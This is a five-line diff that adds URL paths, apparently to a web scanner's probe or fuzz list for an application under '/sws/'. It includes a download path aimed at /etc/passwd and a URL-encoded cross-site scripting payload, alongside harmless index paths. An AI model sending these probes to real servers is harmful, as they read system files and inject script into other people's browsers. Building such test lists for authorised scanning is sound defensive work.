@@ -1,0 +1,5 @@
+/(download)/tmp/poc.txt
+/(download)/etc/passwd
+/%3Cscript%3Ealert(document.domain)%3C/script%3E
+/sws/index.html
+/sws/index.sws
